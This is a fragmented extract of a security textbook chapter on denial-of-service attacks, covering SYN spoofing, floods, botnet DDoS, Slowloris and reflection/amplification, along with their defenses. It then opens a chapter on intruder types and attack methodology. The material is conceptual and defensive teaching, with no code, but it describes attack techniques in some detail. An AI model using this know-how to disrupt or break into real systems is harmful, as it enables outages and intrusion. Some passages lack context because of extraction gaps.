◆	Understand the nature of flooding attacks.
◆	Describe distributed denial-of-service attacks.
◆	Explain the concept of an application-based bandwidth attack and give some
[Word Count: 33]

examples.
◆	Present an overview of reflector and amplifier attacks.
◆	Summarize some of the common defenses against denial-of-service attacks.
◆	Summarize common responses to denial-of-service attacks.
[Word Count: 27]

The temporary takedown in December 2010 of a handful of Web sites that cut 
ties with controversial Web site WikiLeaks, including Visa and MasterCard, made 
worldwide news. Similar attacks, motivated by a variety of reasons, occur thousands 
of times each day, thanks in part to the ease by which Web site disruptions can be 
accomplished.
[Word Count: 55]

Denial of service is a form of attack on the availability of some service. In the con-
text of computer and communications security, the focus is generally on network 
services that are attacked over their network connection. We distinguish this form
[Word Count: 41]

242    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

of attack on availability from other attacks, such as the classic acts of god, that cause 
damage or destruction of IT infrastructure and consequent loss of service.
[Word Count: 27]

The NIST Computer Security Incident Handling Guide [CICH12] defines 
denial-of-service (DoS) attack as follows:
[Word Count: 14]

A denial of service (DoS) is an action that prevents or impairs the authorized 
use of networks, systems, or applications by exhausting resources such as central 
processing units (CPU), memory, bandwidth, and disk space.
[Word Count: 34]

From this definition, you can see that there are several categories of resources 
that could be attacked:
[Word Count: 17]

• Network bandwidth
 
• System resources
 
• Application resources
[Word Count: 9]

A DoS attack targeting system resources typically aims to overload or crash its 
network handling software. Rather than consuming bandwidth with large volumes 
of traffic, specific types of packets are sent that consume the limited resources avail-
able on the system. These include temporary buffers used to hold arriving packets, 
tables of open connections, and similar memory data structures. The SYN spoofing 
attack, which we discuss next, is of this type. It targets the table of TCP connections 
on the server.
[Word Count: 81]

Another form of system resource attack uses packets whose structure triggers 
a bug in the system’s network handling software, causing it to crash. This means the 
system can no longer communicate over the network until this software is reloaded, 
generally by rebooting the target system. This is known as a poison packet. The
[Word Count: 53]

­classic ping of death and teardrop attacks, directed at older Windows 9x systems, 
were of this form. These targeted bugs in the Windows network code that handled 
ICMP (Internet Control Message Protocol) echo request packets and packet frag-
mentation, respectively.
[Word Count: 40]

DoS attacks may also be characterized by how many systems are used to direct 
traffic at the target system. Originally only one, or a small number of source systems 
directly under the attacker’s control, was used. This is all that is required to send the 
packets needed for any attack targeting a bug in a server’s network handling code or
[Word Count: 60]

Figure 7.1  Example Network to Illustrate DoS Attacks
[Word Count: 8]

Internet service
provider (ISP) B 
Broadband
subscribers
[Word Count: 7]

244    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

some application. Attacks requiring high traffic volumes are more commonly sent 
from multiple systems at the same time, using distributed or amplified forms of DoS 
attacks. We discuss these later in this chapter.
[Word Count: 33]

1The diagnostic “ping” command is a common network utility used to test connectivity to the ­specified 
destination. It sends TCP/IP ICMP echo request packets to the destination, and measures the time 
­taken for the echo response packet to return, if at all. Usually these packets are sent at a controlled rate; 
­however, the flood option specifies that they should be sent as fast as possible. This is usually specified 
as “ping –f”.
[Word Count: 72]

maintained in many current operating systems. Having this standard interface avail-
able greatly eases the task of any attacker trying to generate packets with forged 
attributes. Otherwise an attacker would most likely need to install a custom device 
driver on the source system to obtain this level of access to the network, which is 
much more error prone and dependent on operating system version.
[Word Count: 64]

2ICMP packets created in response to other ICMP packets are typically the first to be discarded.
3This is known as “egress filtering.”
[Word Count: 22]

246    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

Along with the basic flooding attack, the other common classic DoS attack is the 
SYN spoofing attack. This attacks the ability of a network server to respond to TCP 
connection requests by overflowing the tables used to manage such connections. 
This means future connection requests from legitimate users fail, denying them 
access to the server. It is thus an attack on system resources, specifically the network 
handling code in the operating system.
[Word Count: 72]

To understand the operation of these attacks, we need to review the three-way 
handshake that TCP uses to establish a connection. This is illustrated in Figure 7.2. 
The client system initiates the request for a TCP connection by sending a SYN packet 
to the server. This identifies the client’s address and port number and supplies an
[Word Count: 56]

Figure 7.2  TCP Three-Way Connection Handshake
[Word Count: 6]

A SYN spoofing attack exploits this behavior on the targeted server system. 
The attacker generates a number of SYN connection request packets with forged 
source addresses. For each of these the server records the details of the TCP con-
nection request and sends the SYN-ACK packet to the claimed source address, 
as shown in Figure 7.3. If there is a valid system at this address, it will respond 
with a RST (reset) packet to cancel this unknown connection request. When the
[Word Count: 81]

248    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

In order to increase the usage of the known TCP connections table, the 
attacker ideally wishes to use addresses that will not respond to the SYN-ACK with 
a RST. This can be done by overloading the host that owns the chosen spoofed 
source address, or by simply using a wide range of random addresses. In this case, 
the attacker relies on the fact that there are many unused addresses on the Internet. 
Consequently, a reasonable proportion of randomly generated addresses will not 
correspond to a real host.
[Word Count: 87]

A flood of packets from a single server or a SYN spoofing attack originating 
on a single system were probably the two most common early forms of DoS attacks. 
In the case of a flooding attack this was a significant limitation, and attacks evolved 
to use multiple systems to increase their effectiveness. We next examine in more 
detail some of the variants of a flooding attack. These can be launched either from a 
single or multiple systems, using a range of mechanisms, which we explore.
[Word Count: 85]

Flooding attacks take a variety of forms, based on which network protocol is 
being used to implement the attack. In all cases the intent is generally to overload 
the ­network capacity on some link to a server. The attack may alternatively aim to 
­overload the server’s ability to handle and respond to this traffic. These attacks flood 
the network link to the server with a torrent of malicious packets competing with, and
[Word Count: 72]

­usually overwhelming, valid traffic flowing to the server. In response to the congestion 
this causes in some routers on the path to the targeted server, many packets will be 
dropped. Valid traffic has a low probability of surviving discard caused by this flood 
and hence of accessing the server. This results in the server’s ability to respond to 
­network ­connection requests being either severely degraded or failing entirely.
[Word Count: 68]

An attacker can generate large volumes of one of these packet types. Because 
these packets include part of some notional erroneous packet that supposedly 
caused the error being reported, they can be made comparatively large, increasing 
their effectiveness in flooding the link.
[Word Count: 42]

Spoofed source addresses are normally used if the attack is generated using 
a single source system, for the same reasons as with ICMP attacks. If multiple sys-
tems are used for the attack, often the real addresses of the compromised, zombie, 
systems are used. When multiple systems are used, the consequences of both the 
reflected flow of packets and the ability to identify the attacker are reduced.
[Word Count: 67]

250    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

Another alternative is to send TCP packets to the target system. Most likely these 
would be normal TCP connection requests, with either real or spoofed source 
addresses. They would have an effect similar to the SYN spoofing attack we have 
described. In this case, though, it is the total volume of packets that is the aim of 
the attack rather than the system code. This is the difference between a SYN spoof-
ing attack and a SYN flooding attack.
[Word Count: 79]

This attack could also use TCP data packets, which would be rejected by the 
server as not belonging to any known connection. But again, by this time the attack 
has already succeeded in flooding the links to the server.
[Word Count: 39]

• Distributed denial-of-service attacks
 
• Reflector attacks
 
• Amplifier attacks
[Word Count: 10]

7.3	 Distributed denial-of-Service Attacks
[Word Count: 4]

While the attacker could command each zombie individually, more generally 
a control hierarchy is used. A small number of systems act as handlers controlling a 
much larger number of agent systems, as shown in Figure 7.4. There are a number 
of advantages to this arrangement. The attacker can send a single command to a 
handler, which then automatically forwards it to all the agents under its control.
[Word Count: 67]

7.3 / Distributed denial-of-Service Attacks   251
[Word Count: 6]

Automated infection tools can also be used to scan for and compromise suitable 
zombie systems, as we discuss in Chapter 6. Once the agent software is uploaded to 
a newly compromised system, it can contact one or more handlers to automatically 
notify them of its availability. By this means, the attacker can automatically grow 
suitable botnets.
[Word Count: 56]

252    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

Many other DDoS tools have been developed since. Instead of using dedi-
cated handler programs, many now use an IRC4 or similar instant messaging server 
program, or web-based HTTP servers, to manage communications with the agents. 
Many of these more recent tools also use cryptographic mechanisms to authenticate 
the agents to the handlers, in order to hinder analysis of command traffic.
[Word Count: 61]

The best defense against being an unwitting participant in a DDoS attack is to 
prevent your systems from being compromised. This requires good system security 
practices and keeping the operating systems and applications on such systems cur-
rent and patched.
[Word Count: 40]

For the target of a DDoS attack, the response is the same as for any flooding 
attack, but with greater volume and complexity. We discuss appropriate defenses 
and responses in Sections 7.5 and 7.6.
[Word Count: 34]

7.4	 Application-based bandwidth Attacks
[Word Count: 4]

A potentially effective strategy for denial of service is to force the target to execute 
resource-consuming operations that are disproportionate to the attack effort. For 
example, Web sites may engage in lengthy operations such as searches, in response 
to a simple request. Application-based bandwidth attacks attempt to take advan-
tage of the disproportionally large resource consumption at a server. In this section, 
we look at two protocols that can be used for such attacks.
[Word Count: 74]

A SIP flood attack exploits the fact that a single INVITE request triggers con-
siderable resource consumption. The attacker can flood a SIP proxy with numerous 
INVITE requests with spoofed IP addresses, or alternately a DDoS attack using a 
botnet to generate numerous INVITE request. This attack puts a load on the SIP
[Word Count: 53]

4Internet Relay Chat (IRC) was one of the earlier instant messaging systems developed, with a number 
of open source server implementations. It is a popular choice for attackers to use and modify as a handler 
program able to control large numbers of agents. Using the standard chat mechanisms, the attacker can 
send a message that is relayed to all agents connected to that channel on the server. Alternatively, the 
message may be directed to just one or a defined group of agents.
5See [STAL11a] for a more detailed description of SIP operation.
[Word Count: 92]

7.4 / Application-based bandwidth Attacks   253
[Word Count: 6]

proxy servers in two ways. First, their server resources are depleted in processing 
the INVITE requests. Second, their network capacity is consumed. Call receivers 
are also victims of this attack. A target system will be flooded with forged VoIP 
calls, making the system unavailable for legitimate incoming calls.
[Word Count: 48]

We consider two different approaches to exploiting the Hypertext Transfer Protocol 
(HTTP) to deny service.
[Word Count: 15]

HTTP Flood  An HTTP flood refers to an attack that bombards Web servers 
with HTTP requests. Typically, this is a DDoS attack, with HTTP requests coming 
from many different bots. The requests can be designed to consume considerable 
resources. For example, an HTTP request to download a large file from the target 
causes the Web server to read the file from hard disk, store it in memory, convert it 
into a packet stream, and then transmit the packets. This process consumes memory, 
processing, and transmission resources.
[Word Count: 86]

Returns IP
address of Bob’s
proxy server
[Word Count: 7]

254    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

A variant of this attack is known as a recursive HTTP flood. In this case, the 
bots start from a given HTTP link and then follows all links on the provided Web 
site in a recursive way. This is also called spidering.
[Word Count: 42]

Slowloris  An intriguing and unusual form of HTTP-based attack is Slowloris 
[SOUR12], [DAMO12]. Slowloris exploits the common server technique of using 
multiple threads to support multiple requests to the same server application. It 
attempts to monopolize all of the available request handling threads on the Web 
server by sending HTTP requests that never complete. Since each request consumes 
a thread, the Slowloris attack eventually consumes all of the Web server’s connection 
capacity, effectively denying access to legitimate users.
[Word Count: 78]

Slowloris is different from typical denials of service in that Slowloris traffic 
utilizes legitimate HTTP traffic, and does not rely on using special “bad” HTTP 
requests that exploit bugs in specific HTTP servers. Because of this, existing intru-
sion detection and intrusion prevention solutions that rely on signatures to detect 
attacks will generally not recognize Slowloris. This means that Slowloris is capa-
ble of being effective even when standard enterprise-grade intrusion detection and 
intrusion prevention systems are in place.
[Word Count: 79]

In contrast to DDoS attacks, where the intermediaries are compromised systems 
running the attacker’s programs, reflector and amplifier attacks use network ­systems 
functioning normally. The attacker sends a network packet with a spoofed source 
address to a service running on some network server. The server responds to this 
packet, sending it to the spoofed source address that belongs to the actual attack
[Word Count: 62]

7.5 / Reflector and amplifier Attacks   255
[Word Count: 7]

target. If the attacker sends a number of requests to a number of servers, all with the 
same spoofed source address, the resulting flood of responses can overwhelm the 
target’s network link. The fact that normal server systems are being used as inter-
mediaries, and that their handling of the packets is entirely conventional, means 
these attacks can be easier to deploy and harder to trace back to the actual attacker. 
There are two basic variants of this type of attack: the simple reflection attack and 
the amplification attack.
[Word Count: 89]

The reflection attack is a direct implementation of this type of attack. The attacker 
sends packets to a known service on the intermediary with a spoofed source address 
of the actual target system. When the intermediary responds, the response is sent to 
the target. Effectively this reflects the attack off the intermediary, which is termed 
the reflector, and is why this is called a reflection attack.
[Word Count: 66]

6Chargen is the character generator diagnostic service that returns a stream of characters to the client that 
connects to it. Domain Name Service (DNS) is used to translate between names and IP addresses. The 
Simple Network Management Protocol (SNMP) is used to manage network devices by sending queries 
to which they can respond with large volumes of detailed management information. The Internet Security 
Association and Key Management Protocol (ISAKMP) provides the framework for managing keys in the 
IP Security Architecture (IPsec), as we discuss in Chapter 22.
[Word Count: 87]

256    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

A further variation of the reflector attack establishes a self-contained loop 
between the intermediary and the target system. Both systems act as reflectors. 
Figure 7.6 shows this type of attack. The upper part of the figure shows normal 
Domain Name System operation.7 The DNS client sends a query from its UDP
[Word Count: 51]

7.5 / Reflector and amplifier Attacks   257
[Word Count: 7]

While very effective if possible, this type of attack is fairly easy to filter for 
because the combinations of service ports used should never occur in normal net-
work operation.
[Word Count: 30]

When implementing any of these reflection attacks, the attacker could use just 
one system as the original source of packets. This suffices, particularly if a ­service is used 
that generates larger response packets than those originally sent to the ­intermediary. 
Alternatively, multiple systems might be used to generate higher ­volumes of traffic 
to be reflected and to further obscure the path back to the attacker. Typically a botnet 
would be used in this case.
[Word Count: 74]

Fundamental to the success of reflection attacks is the ability to create 
spoofed-source packets. If filters are in place that block spoofed-source packets, as 
described in (RFC 2827), then these attacks are simply not possible. This is the most 
basic, fundamental defense against such attacks. This is not the case with either 
SYN spoofing or flooding attacks (distributed or not). They can succeed using real 
source addresses, with the consequences already noted.
[Word Count: 72]

Amplification attacks are a variant of reflector attacks and also involve sending a 
packet with a spoofed source address for the target system to intermediaries. They 
differ in generating multiple response packets for each original packet sent. This can 
be achieved by directing the original request to the broadcast address for some net-
work. As a result, all hosts on that network can potentially respond to the request, 
generating a flood of responses as shown in Figure 7.7. It is only necessary to use 
a service handled by large numbers of hosts on the intermediate network. A ping
[Word Count: 98]

258    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

flood using ICMP echo request packets was a common choice, since this ­service 
is a fundamental component of TCP/IP implementations and was often allowed 
into networks. The well-known smurf DoS program used this mechanism and was 
widely popular for some time. Another possibility is to use a suitable UDP service, 
such as the echo service. The fraggle program implemented this variant. Note that 
TCP services cannot be used in this type of attack; because they are connection 
oriented, they cannot be directed at a broadcast address. Broadcasts are inherently 
connectionless.
[Word Count: 90]

The best additional defense against this form of attack is to not allow directed 
broadcasts to be routed into a network from outside. Indeed, this is another long-
standing security recommendation, unfortunately about as widely implemented as 
that for blocking spoofed source addresses. If these forms of filtering are in place, 
these attacks cannot succeed. Another defense is to limit network services like echo 
and ping from being accessed from outside an organization. This restricts which 
services could be used in these attacks, at a cost in ease of analyzing some legitimate 
network problems.
[Word Count: 94]

Attackers scan the Internet looking for well-connected networks that do allow 
directed broadcasts and that implement suitable services attackers can reflect off. 
These lists are traded and used to implement such attacks.
[Word Count: 32]

7.6 / Defenses against denial-of-service Attacks   259
[Word Count: 7]

These attacks have been seen for several years. More recently, the DNS 
­protocol has been extended to allow much larger responses of over 4000 bytes to 
support extended DNS features such as IPv6, security, and others. By targeting 
servers that support the extended DNS protocol, significantly greater amplification 
can be achieved than with the classic DNS protocol.
[Word Count: 57]

Like all the reflection-based attacks, the basic defense against these is to 
prevent the use of spoofed source addresses. Appropriate configuration of DNS 
servers, in particular limiting recursive responses to internal client systems only, as 
described in RFC 5358, can restrict some variants of this attack.
[Word Count: 46]

7.6	 Defenses against denial-of-service Attacks
[Word Count: 5]

260    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

accidental or deliberate overload without also compromising network performance. 
The provision of significant excess network bandwidth and replicated distributed 
servers is the usual response, particularly when the overload is anticipated. This is 
regularly done for popular sporting sites. However, this response does have a sig-
nificant implementation cost.
[Word Count: 48]

In general, there are four lines of defense against DDoS attacks [PENG07, 
CHAN02]:
[Word Count: 13]

• Attack prevention and preemption (before the attack): These mechanisms
[Word Count: 10]

enable the victim to endure attack attempts without denying service to legiti-
mate clients. Techniques include enforcing policies for resource consumption 
and providing backup resources available on demand. In addition, preven-
tion mechanisms modify systems and protocols on the Internet to reduce the 
­possibility of DDoS attacks.
 
• Attack detection and filtering (during the attack): These mechanisms attempt
[Word Count: 58]

to detect the attack as it begins and respond immediately. This minimizes the 
impact of the attack on the target. Detection involves looking for suspicious 
patterns of behavior. Response involves filtering out packets likely to be part 
of the attack.
 
• Attack source traceback and identification (during and after the attack): This
[Word Count: 52]

is an attempt to identify the source of the attack as a first step in ­preventing 
future attacks. However, this method typically does not yield results fast 
enough, if at all, to mitigate an ongoing attack.
 
• Attack reaction (after the attack): This is an attempt to eliminate or curtail the
[Word Count: 51]

We discuss the first of these lines of defense in this section and consider the 
remaining three in Section 7.7.
[Word Count: 20]

A critical component of many DoS attacks is the use of spoofed source 
addresses. These either obscure the originating system of direct and distributed DoS 
attacks or are used to direct reflected or amplified traffic to the target system. Hence 
one of the fundamental, and longest standing, recommendations for defense against 
these attacks is to limit the ability of systems to send packets with spoofed source 
addresses. RFC 2827, Network Ingress Filtering: Defeating Denial-of-service attacks 
which employ IP Source Address Spoofing,8 directly makes this recommendation, as 
do SANS, CERT, and many other organizations concerned with network security.
[Word Count: 97]

8Note that while the title uses the term Ingress Filtering, the RFC actually describes Egress Filtering, with 
the behavior we discuss. True ingress filtering rejects outside packets using source addresses that belong 
to the local network. This provides protection against only a small number of attacks.
[Word Count: 46]

7.6 / Defenses against denial-of-service Attacks   261
[Word Count: 7]

There are some disadvantages of this technique. It does take computation 
resources on the server to calculate the cookie. It also blocks the use of certain TCP 
extensions, such as large windows. The request for such an extension is normally
[Word Count: 40]

262    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

Another defense against SYN spoofing attacks includes modifying parameters 
used in a system’s TCP/IP network code. These include the size of the TCP con-
nections table and the timeout period used to remove entries from this table when 
no response is received. These can be combined with suitable rate limits on the 
organization’s network link to manage the maximum allowable rate of connection 
requests. None of these changes can prevent these attacks, though they do make the 
attacker’s task harder.
[Word Count: 80]

The best defense against broadcast amplification attacks is to block the use of 
IP-directed broadcasts. This can be done either by the ISP or by any organization 
whose systems could be used as an intermediary. As we noted earlier in this chap-
ter, this and antispoofing filters are long-standing security recommendations that 
all organizations should implement. More generally, limiting or blocking traffic to 
suspicious services, or combinations of source and destination ports, can restrict the 
types of reflection attacks that can be used against an organization.
[Word Count: 86]

Defending against attacks on application resources generally requires 
­modification to the applications targeted, such as Web servers. Defenses may 
involve attempts to identify legitimate, generally human initiated, interactions from 
automated DoS attacks. These often take the form of a graphical puzzle, a captcha, 
which is easy for most humans to solve but difficult to automate. This approach 
is used by many of the large portal sites like Hotmail and Yahoo. Alternatively, 
­applications may limit the rate of some types of interactions in order to continue to 
provide some form of service. Some of these alternatives are explored in [KAND05].
[Word Count: 99]

Beyond these direct defenses against DoS attack mechanisms, overall good 
system security practices should be maintained. The aim is to ensure that your 
systems are not compromised and used as zombie systems. Suitable configuration 
and monitoring of high performance, well-connected servers is also needed to help 
ensure that they do not contribute to the problem as potential intermediary servers.
[Word Count: 59]

Lastly, if an organization is dependent on network services, it should consider 
mirroring and replicating these servers over multiple sites with multiple ­network
[Word Count: 23]

7.7 / Responding to a denial-of-service Attack   263
[Word Count: 8]

connections. This is good general practice for high-performance servers, and 
provides greater levels of reliability and fault tolerance in general and not just a 
response to these types of attack.
[Word Count: 30]

7.7	 Responding to a denial-of-service Attack
[Word Count: 6]

To respond successfully to a DoS attack, a good incident response plan is needed. 
This must include details of how to contact technical personal for your Internet 
service provider(s). This contact must be possible using nonnetworked means, since 
when under attack your network connection may well not be usable. DoS attacks, 
particularly flooding attacks, can only be filtered upstream of your network connec-
tion. The plan should also contain details of how to respond to the attack. The divi-
sion of responsibilities between organizational personnel and the ISP will depend 
on the resources available and technical capabilities of the organization.
[Word Count: 100]

The organization may also wish to ask its ISP to trace the flow of packets back 
in an attempt to identify their source. However, if spoofed source addresses are 
used, this can be difficult and time-consuming. Whether this is attempted may well 
depend on whether the organization intends to report the attack to the relevant law 
enforcement agencies. In such a case, additional evidence must be collected and 
actions documented to support any subsequent legal action.
[Word Count: 76]

In the case of an extended, concerted, flooding attack from a large number of 
distributed or reflected systems, it may not be possible to successfully filter enough 
of the attack packets to restore network connectivity. In such cases, the ­organization 
needs a contingency strategy either to switch to alternate backup servers or to rapidly
[Word Count: 54]

264    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

commission new servers at a new site with new addresses, in order to restore serv-
ice. Without forward planning to achieve this, the consequence of such an attack 
will be extended loss of network connectivity. If the organization depends on this 
connection for its function, the consequences on it may be significant.
[Word Count: 52]

Following the immediate response to this specific type of attack, the organiza-
tion’s incident response policy may specify further steps that are taken to respond 
to contingencies like this. This should certainly include analyzing the attack and 
response in order to gain benefit from the experience and to improve future han-
dling. Ideally the organization’s security can be improved as a result. We discuss all 
these aspects of incident response further in Chapter 17.
[Word Count: 74]

[PENG07] is an excellent survey of DoS attacks and defenses. Another compre-
hensive survey is [HAND06]. [CICH12] includes some guidance on types of DoS 
attacks and how to prepare for and respond to them.
[Word Count: 34]

[CHAN02] provides suggestions for defending against DDoS attacks. [LIU09] 
is a short but useful article on the same subject.
[Word Count: 19]

CHAN02	 Chang, R. “Defending Against Flooding-Based Distributed Denial-of-Service
[Word Count: 8]

Attacks: A Tutorial.” IEEE Communications Magazine, October 2002.
CICH12	
Cichonksi, P. Computer Security Incident Handling Guide. NIST Special 
Publication 800-61, August 2012.
HAND06	 Handley, M., and Rescorla, E. Internet Denial-of-Service Considerations.
[Word Count: 31]

RFC 4732, November 2006.
LIU09	
Liu, S. “Surviving Distributed Denial-of-Service Attacks.” IT Pro, 
September/October 2009.
PENG07	 Peng, T.; Leckie, C.; and Rammohanarao, K. “Survey of Network-Based
[Word Count: 26]

Defense Mechanisms Countering the DoS and DDoS Problems.” ACM 
Computing Surveys, April 2007.
[Word Count: 13]

7.9 	 Key Terms, Review Questions, and Problems
[Word Count: 7]

amplification attack
availability
backscatter traffic
botnet
denial of service (DoS)
[Word Count: 10]

directed broadcast
distributed denial of
[Word Count: 5]

service (DDoS)
DNS amplification attack
flash crowd
[Word Count: 7]

flooding attack
Internet Control Message
[Word Count: 5]

Protocol (ICMP)
ICMP flood
poison packet
[Word Count: 6]

7.9 / Key Terms, Review Questions, and Problems   265
[Word Count: 9]

random drop
reflection attack
slashdotted
source address spoofing
[Word Count: 8]

three-way TCP handshake
UDP
UDP flood
zombie
[Word Count: 7]

266    Chapter 7 / Denial-of-Service Attacks
[Word Count: 6]

8.2	 Intrusion Detection
Basic Principles
The Base-Rate Fallacy
Requirements
[Word Count: 9]

8.3	 Analysis Approaches
Anomaly Detection
Signature or Heuristic Detection
[Word Count: 9]

8.4	 Host-Based Intrusion Detection
Data Sources and Sensors
Anomaly HIDS
Signature or Heuristic HIDS
Distributed HIDS
[Word Count: 16]

8.5	 Network-Based Intrusion Detection
Types of Network Sensors
NIDS Sensor Deployment
Intrusion Detection Techniques
Logging of Alerts
[Word Count: 17]

8.6	 Distributed or Hybrid Intrusion Detection
[Word Count: 6]

8.7	 Intrusion Detection Exchange Format
[Word Count: 5]

8.9	 Example System: Snort
Snort Architecture
Snort Rules
[Word Count: 8]

8.11	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Distinguish among various types of intruder behavior patterns.
◆	Understand the basic principles of and requirements for intrusion detection.
◆	Discuss the key features of host-based intrusion detection.
◆	Explain the concept of distributed host-based intrusion detection.
◆	Discuss the key features network-based intrusion detection.
◆	Define the intrustion detection exchange format.
◆	Explain the purpose of honeypots.
◆	Present an overview of Snort.
[Word Count: 65]

A significant security problem for networked systems is hostile, or at least unwanted, 
trespass by users or software. User trespass can take the form of unauthorized logon 
to a machine or, in the case of an authorized user, acquisition of privileges or per-
formance of actions beyond those that have been authorized. Software trespass can 
take the form of a virus, worm, or Trojan horse.
[Word Count: 65]

This chapter covers the subject of intrusions. We discuss other forms of attack 
in subsequent chapters. First, we examine the nature of intruders and how they 
attack and then look at strategies for detecting intrusions.
[Word Count: 35]

As with any defense strategy, an understanding of possible motivations of the 
attackers can assist in designing a suitable defensive strategy. Again, both Symantec 
[SYMA13] and Verizon [VERI13] comment on the following broad classes of intruders:
[Word Count: 36]

• Cyber criminals:  Are either individuals or members of an organized crime
[Word Count: 12]

group with a goal of financial reward. To achieve this, their activities may 
­include identity theft, theft of financial credentials, corporate espionage, data 
theft, or data ransoming. Typically, they are young, often Eastern European, 
Russian, or southeast Asian hackers, who do business on the Web [ANTE06].
[Word Count: 46]

They meet in underground forums with names like DarkMarket.org and  
theftservices.com to trade tips and data and coordinate attacks. For some 
years ­reports such as [SYMA13] have quoted very large and increasing costs 
resulting from cyber-crime activities, and hence the need to take steps to miti-
gate this threat.
 
• Activists:  Are either individuals, usually working as insiders, or members of
[Word Count: 61]

a larger group of outsider attackers, who are motivated by social or political 
causes. They are also known as hacktivists, and their skill level is often quite 
low. The aim of their attacks is often to promote and publicize their cause, 
typically through website defacement, denial of service attacks, or the theft 
and distribution of data that results in negative publicity or compromise of 
their targets. Well-known recent examples include the activities of the groups 
Anonymous and LulzSec, and the actions of Chelsea (formerly Bradley) 
Manning and Edward Snowden.
 
• State-sponsored organizations:  Are groups of hackers sponsored by govern-
[Word Count: 99]

ments to conduct espionage or sabotage activities. They are also known as 
Advanced Persistent Threats (APTs), due to the covert nature and persist-
ence over extended periods involved with many attacks in this class. Recent 
reports such as [MAND13], and information revealed by Edward Snowden, 
indicate the widespread nature and scope of these activities by a wide range of 
countries from China to the USA, UK, and their intelligence allies.
 
• Others:  Are hackers with motivations other than those listed above, includ-
[Word Count: 82]

ing classic hackers or crackers who are motivated by technical challenge or 
by peer-group esteem and reputation. Many of those responsible for discov-
ering new categories of buffer overflow vulnerabilities [MEER10] could be 
regarded as members of this class. Also, given the wide availability of attack 
toolkits, there is a pool of “hobby hackers” using them to explore system and 
network security, who could potentially become recruits for the above classes.
[Word Count: 71]

Across these classes of intruders, there is also a range of skill levels seen. 
These can be broadly classified as:
[Word Count: 20]

• Apprentice:  Hackers with minimal technical skill who primarily use existing
[Word Count: 11]

attack toolkits. They likely comprise the largest number of attackers, includ-
ing many criminal and activist attackers. Given their use of existing known 
tools, these attackers are the easiest to defend against. They are also known as 
“script-kiddies” due to their use of existing scripts (tools).
 
• Journeyman:  Hackers with sufficient technical skills to modify and extend
[Word Count: 57]

attack toolkits to use newly discovered, or purchased, vulnerabilities; or to 
focus on different target groups. They may also be able to locate new vul-
nerabilities to exploit that are similar to some already known. A number of 
hackers with such skills are likely found in all intruder classes listed above, 
­adapting tools for use by others. The changes in attack tools make identifying 
and defending against such attacks harder.
 
• Master:  Hackers with high-level technical skills capable of discovering brand
[Word Count: 81]

new categories of vulnerabilities, or writing new powerful attack toolkits. 
Some of the better-known classical hackers are of this level, as clearly are
[Word Count: 23]

some of those employed by some state-sponsored organizations, as the desig-
nation APT suggests. This makes defending against these attacks of the high-
est difficulty.
[Word Count: 25]

Intruder attacks range from the benign to the serious. At the benign end of 
the scale, there are people who simply wish to explore internets and see what is out 
there. At the serious end are individuals or groups that attempt to read privileged 
data, perform unauthorized modifications to data, or disrupt systems.
[Word Count: 53]

[CICH12] lists the following examples of intrusion:
[Word Count: 7]

• Performing a remote root compromise of an e-mail server
 
• Defacing a Web server
 
• Guessing and cracking passwords
 
• Copying a database containing credit card numbers
 
• Viewing sensitive data, including payroll records and medical information,
[Word Count: 38]

without authorization
 
• Running a packet sniffer on a workstation to capture usernames and passwords
 
• Using a permission error on an anonymous FTP server to distribute pirated
[Word Count: 28]

software and music files
 
• Dialing into an unsecured modem and gaining internal network access
 
• Posing as an executive, calling the help desk, resetting the executive’s e-mail
[Word Count: 28]

password, and learning the new password
 
• Using an unattended, logged-in workstation without permission
[Word Count: 14]

The techniques and behavior patterns of intruders are constantly shifting, to exploit 
newly discovered weaknesses and to evade detection and countermeasures. However, 
intruders typically use steps from a common attack methodology. [MCCL12] discuss 
in detail activities associated with the following steps:
[Word Count: 41]

• Target Acquisition and Information Gathering:  Where the attacker identifies
[Word Count: 10]

and characterizes the target systems using publicly available information, both 
technical and non-technical, and the use network exploration tools to map tar-
get resources.
[Word Count: 24]

• Initial Access:  The initial access to a target system, typically by exploiting a
[Word Count: 14]

remote network vulnerability as we discuss in Chapters 10 and 11, by guessing 
weak authentication credentials used in a remote service as we discussed in 
Chapter 3, or via the installation of malware on the system using some form of 
social engineering or drive-by-download attack as we discuss in Chapter 6.
 
• Privilege Escalation:  Actions taken on the system, typically via a local access
[Word Count: 64]

vulnerability as discussed in Chapters 10 and 11, to increase the privileges 
available to the attacker to enable their desired goals on the target system.
 
• Information Gathering or System Exploit:  Actions by the attacker to access
[Word Count: 37]

or modify information or resources on the system, or to navigate to another 
target ­system.
 
• Maintaining Access:  Actions such as the installation of backdoors or other
[Word Count: 27]

malicious software as we discuss in Chapter 6, or through the addition of cov-
ert authentication credentials or other configuration changes to the system, to 
enable continued access by the attacker after the initial attack.
 
• Covering Tracks:  Where the attacker disables or edits audit logs such as we dis-
[Word Count: 50]

cuss in Chapter 18, to remove evidence of attack activity, and uses rootkits and 
other measures to hide covertly installed files or code as we discuss in Chapter 6.
[Word Count: 29]

Table 8.1 lists examples of activities associated with the above steps.
[Word Count: 11]

Table 8.1  Examples of Intruder Behavior
[Word Count: 6]

(a) Target Acquisition and Information Gathering
[Word Count: 6]

• Explore corporate website for information on corporate structure, personnel, key systems, as well
[Word Count: 14]

as details of specific web server and OS used.
[Word Count: 9]

• Gather information on target network using DNS lookup tools such as dig, host, and others; and
[Word Count: 17]

• Map network for accessible services using tools such as NMAP.
[Word Count: 11]

• Send query email to customer service contact, review response for information on mail client,
[Word Count: 15]

server, and OS used, and also details of person responding.
[Word Count: 10]

• Identify potentially vulnerable services, eg vulnerable web CMS.
[Word Count: 9]

• Brute force (guess) a user’s web content management system (CMS) password.
[Word Count: 12]

• Exploit vulnerability in web CMS plugin to gain system access.
[Word Count: 11]

• Send spear-phishing email with link to web browser exploit to key people.
[Word Count: 13]

• Scan system for applications with local exploit.
[Word Count: 8]

